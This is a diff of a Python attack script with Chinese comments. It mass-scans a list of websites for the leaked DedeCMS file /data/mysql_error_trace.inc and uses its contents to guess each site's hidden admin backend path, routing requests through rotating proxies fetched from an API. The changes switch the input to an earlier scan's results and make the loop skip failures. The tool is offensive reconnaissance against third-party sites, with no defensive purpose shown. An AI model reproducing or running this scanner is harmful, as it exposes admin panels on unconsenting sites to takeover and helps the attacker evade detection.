@@ -1,5 +1,5 @@
 # -*- coding: utf-8 -*-
-
+### 爆后台路径补充版：通过yourdomain/data/mysql_error_trace.inc猜测类似后台地址。
 import re
 import os
 import requests
@@ -41,7 +41,7 @@ def my_requests(url, method='get', timeout=15, try_count=3, **args):
         print("请求url:%s失败，剩余重试次数：%d" % (url, n))
 
 def getip(method='get', timeout=15, try_count=3, **args):
-    url = "http://d.jghttp.golangapi.com/getip?num=1&type=1&pro=&city=0&yys=0&port=1&time=1&ts=0&ys=0&cs=0&lb=1&sb=0&pb=4&mr=2&regions="
+    url = ""
     response = requests.request(method=method, url=url, headers=utils.get_headers(), timeout=timeout, **args)
     if response.status_code == 200:
         proxies = {'https': response.text.replace('\r\n', '')}
@@ -79,13 +79,13 @@ class Unit(object):
 
 if __name__ == '__main__':
     try:
-        filename = "注册记录_821.txt"
-        WordList = Unit().getfilelist('./target/' + filename)
+        filename = "注册扫描结果"
+        WordList = Unit().getfilelist('./res/' + filename)
         for txt in WordList:
-            arrary =[]
-            words = ['member','plus','m']
-            if "注册成功" in txt:
-                domain_url = txt.split('----')[0]
+            try:
+                arrary =[]
+                words = ['member','plus','m']
+                domain_url = txt.replace('\r','')
                 select_url = domain_url+"/data/mysql_error_trace.inc"
                 response = my_requests(url=select_url)
                 if response:
@@ -114,7 +114,8 @@ if __name__ == '__main__':
                                         continue
                     if len(arrary) == 0:
                         print(domain_url + '未找到相对于目录')
-
+            except:
+                continue
 
     except Exception as e:
         print(e)
